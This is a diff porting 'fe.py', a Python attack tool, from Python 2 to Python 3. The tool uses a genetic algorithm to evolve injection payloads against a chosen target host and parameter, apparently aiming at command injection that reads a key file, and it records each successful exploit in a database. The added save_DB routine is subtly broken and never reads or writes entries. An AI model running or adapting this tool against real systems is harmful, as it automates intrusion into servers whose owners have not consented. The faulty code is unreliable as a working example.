@@ -16,32 +16,32 @@ import requests
 import time
 from sys import argv
 import random
-from Queue import PriorityQueue
+from queue import PriorityQueue
 import base64
 import zlib
 
-print """
+print("""
 __                   ___
 |_  _  __ _  _  _|   |_     _  |    _|_ o  _ __
 |  (_) | (_ (/_(_|   |__\_/(_) | |_| |_ | (_)| |
 
 by soen
-"""
+""")
 
 
 def usage():
-    print 'Usage:'
-    print '  python fe.py <options>'
-    print '  Options:'
-    print '    TARGET=<target IP / hostname>'
-    print '    ADDR=<directory>'
-    print '    VULN_VAR=<vulnerable variable>'
-    print '    METHOD=<post/get>'
-    print '    OTHER_VARIABLES=[other variables for post/get request]'
-    print '      VAR1=DATA1&VAR2=DATA2'
-    print '    GOAL_TEXT=<server response indicating successful exploitation>'
-    print
-    print ' TARGET,ADDR,VULN_VAR,METHOD,GOAL_TEXT are required'
+    print('Usage:')
+    print('  python fe.py <options>')
+    print('  Options:')
+    print('    TARGET=<target IP / hostname>')
+    print('    ADDR=<directory>')
+    print('    VULN_VAR=<vulnerable variable>')
+    print('    METHOD=<post/get>')
+    print('    OTHER_VARIABLES=[other variables for post/get request]')
+    print('      VAR1=DATA1&VAR2=DATA2')
+    print('    GOAL_TEXT=<server response indicating successful exploitation>')
+    print()
+    print(' TARGET,ADDR,VULN_VAR,METHOD,GOAL_TEXT are required')
 
 
 start_time = time.time()
@@ -63,9 +63,7 @@ MAX_MUTATIONS = 1         # loaded_genomes * GENE_POOL_INFLUENCE)
 REQ_TOTAL = 0
 BASE_RESPONSE = ''
 METHOD = 'get'  # default is get, but post is allowed as well
-###DBSTARTMARKER###
-DB = ''
-###DBENDMARKER###
+
 
 
 def process_command_line():
@@ -75,16 +73,16 @@ def process_command_line():
         usage()
     try:
         TARGET = argv[1].split('=')[1]
-        print '[+]\tTarget %s acquired!' % TARGET
+        print('[+]\tTarget %s acquired!' % TARGET)
         ADDR = argv[2].split('=')[1]
         if ADDR[0] == '/':
             ADDR = ADDR[1:]
-        print '[+]\tPath %s acquired!' % ADDR
+        print('[+]\tPath %s acquired!' % ADDR)
         VULN_VAR = argv[3].split('=')[1]
-        print '[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR
+        print('[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR)
         METHOD = (((argv[4].split('=')[1] == 'post') and 1) or 0)
-        print '[+]\tUsing method [%s] for GREAT success' %\
-            ((METHOD and 'post') or 'get')
+        print('[+]\tUsing method [%s] for GREAT success' %\
+            ((METHOD and 'post') or 'get'))
         OTHER_VARIABLES = {}
         if (len(argv) == 7):
             ov = argv[5][len('OTHER_VARIABLES='):]
@@ -104,7 +102,7 @@ def process_command_line():
             GOAL_TEXT = argv[6].split('=')[1]
         else:
             GOAL_TEXT = argv[5].split('=')[1]
-        print '[+]\tAttempting to gain a base heuristic...'
+        print('[+]\tAttempting to gain a base heuristic...')
         OTHER_VARIABLES[VULN_VAR] = 'AAAA'
         BASE_RESPONSE = requests.get(
             'http://%s/%s' % (TARGET, ADDR),
@@ -113,16 +111,16 @@ def process_command_line():
         ).text
         if (BASE_RESPONSE.lower().find('not found') != -1 or
                 BASE_RESPONSE.lower().find('404') != -1):
-            print '404 or \'not found\' discovered on page....are you' + \
-                  'sure this is OK?'
-            print '\npage text:\n\n'
-            print BASE_RESPONSE
-            print
-            if not raw_input('y/n').lower().find('y'):
+            print('404 or \'not found\' discovered on page....are you' + \
+                  'sure this is OK?')
+            print('\npage text:\n\n')
+            print(BASE_RESPONSE)
+            print()
+            if not input('y/n').lower().find('y'):
                 exit(0)
         return True
     except:
-        print 'commandline argument FAIL\n\n'
+        print('commandline argument FAIL\n\n')
         return False
 
 
@@ -144,6 +142,15 @@ class Creature:
             for i in range(random.randint(tmp / 2, tmp)):
                 self.genome += tools[random.randrange(0, len(tools))]
         return None
+
+    def __eq__(self, other):
+        return self.score == other.score
+
+    def __lt__(self,other):     
+        return self.score<other.score
+
+    def __gt__(self,other):     
+        return self.score>other.score
 
     def run_simulation(self):
         global TARGET, ADDR, VULN_VAR, TIMEOUT, REQ_TOTAL,\
@@ -239,7 +246,7 @@ def breed_it(ca):
             c_temp.put((cq.score, cq))
             return c_temp
         a = ca.pop(0)
-        a1 = a.genome[0:len(a.genome) / 2]
+        a1 = a.genome[0:len(a.genome) // 2]
         a2 = a.genome[len(a.genome):]
         # pull a random partner to mate with
         # it's a free society, after all
@@ -277,22 +284,22 @@ def fitnessfunction(creature_to_score):
         return
     if ((creature_to_score.genome.find('cat') != -1) and
             (creature_to_score.genome.find('key') != -1)):
-        print ' this bastard should work....'
-        print creature_to_score.genome
-        print s['text']
-        print s['url']
+        print(' this bastard should work....')
+        print(creature_to_score.genome)
+        print(s['text'])
+        print(s['url'])
     if (s['text'].lower().find(GOAL_TEXT.lower()) != -1):
         creature_to_score.score -= 100
-        print '[+]\tExploit Found'
-        print """
+        print('[+]\tExploit Found')
+        print("""
 ------------------------------------------
  __    _                  _             |
 |_    |_) |  _  o _|_   _|_ _    __  _| |
 |__>< |   | (_) |  |_    | (_)|_|| |(_| o
 
-------------------------------------------"""
-        print creature_to_score.genome
-        print '------------------------------------------'
+------------------------------------------""")
+        print(creature_to_score.genome)
+        print('------------------------------------------')
         save_DB(creature_to_score.genome)
         return 1
     elif (str(s['status_code']) == '500'):
@@ -312,7 +319,7 @@ def main():
     if process_command_line():
         c0 = []
         c1 = PriorityQueue()
-        print '[+]\tLoading DB...'
+        print('[+]\tLoading DB...')
         #load in creatures from DB
         lc = load_DB()
         #f = open('database', 'a')
@@ -322,8 +329,8 @@ def main():
         #f.close()
         loaded_creatures = lc.split('\n')
         #finish loading
-        print '[+]\tSuccess'
-        print '[+]\tCreating initial batch of creatures...'
+        print('[+]\tSuccess')
+        print('[+]\tCreating initial batch of creatures...')
         cl = create_creatures(CREATURE_COUNT, GENOME_LENGTH, tools)
         generation = 0
         for i in cl:
@@ -332,7 +339,7 @@ def main():
             c1.put((50, Creature(0, i)))
             for ii in range(0, GENE_POOL_INFLUENCE-1):
                 c1.put((50, Creature(0, mutate(i))))
-        print '[+]\tSuccess'
+        print('[+]\tSuccess')
         #print '[+]\tPre-breeeding in loaded creatures with the population' +\
         #    ' for great success'
         #while not c1.empty():
@@ -340,13 +347,13 @@ def main():
         #    c0.append(c)
         #c1 = breed_it(c0)
         #c1 = c0
-        print '[+]\tSuccess'
+        print('[+]\tSuccess')
         exploit_found = 0
         while exploit_found == 0:
             generation += 1
             CREATURE_COUNT = c1.qsize()
-            print '[>]\tRunning with creature_count %d,\tgeneration %d' %\
-                (CREATURE_COUNT, generation)
+            print('[>]\tRunning with creature_count %d,\tgeneration %d' %\
+                (CREATURE_COUNT, generation))
             c2 = PriorityQueue(0)
             cached_c = 0
             total_c = 0
@@ -367,36 +374,37 @@ def main():
                 c = c3.get()[1]
                 c4.append(c)
             c1 = breed_it(c4)
-        print '[i]\tExploit found in %d seconds with %d requests' %\
-            (abs(int(start_time - time.time())), REQ_TOTAL)
+        print('[i]\tExploit found in %d seconds with %d requests' %\
+            (abs(int(start_time - time.time())), REQ_TOTAL))
 
 
 def load_DB():
-    if DB != '':
-        return zlib.decompress(base64.b64decode(DB))
-    else:
-        print '[!]\tInternal database not found, attempting to load ' +\
-              'external...'
-        lc = ''
-        f = open('database', 'a')
-        f.close()
-        f = open('database')
-        lc = f.read().replace('\r\n', '\n')
-        f.close()
-        return lc
+    print('[!]\tInternal database not found, attempting to load ' +\
+          'external...')
+    lc = ''
+    f = open('database', 'a')
+    f.close()
+    f = open('database')
+    lc = f.read().replace('\r\n', '\n')
+    f.close()
+    return lc
+
+    # with open('database','r') as db:
+        # return db.readlines()
+
 
 
 def save_DB(exploit_found):
-    f = open(argv[0], 'r+')
-    tmp = f.read()
-    f.seek(0)
-    db_start = tmp.find('###DBSTARTMARKER###') +\
-        len('###DBSTARTMARKER###') + 1
-    db_end = tmp.find('###DBENDMARKER###')
-    DB = base64.b64encode(zlib.compress(load_DB() + '\n' + exploit_found))
-    tmp = tmp[0:db_start] + 'DB = \'' + DB + '\'\n' + tmp[db_end:]
-    f.write(tmp)
-    f.close()
+    with open("database", "a+") as db:
+        for line in db:
+            if exploit_found in line:
+                return 'EXPLOIT ALREADY IN DB'
+            else:
+                db.write(exploit_found + '\n')
+                return 'EXPLOIT SAVED TO DB'
+                
+
+
 
 if __name__ == '__main__':
     main()
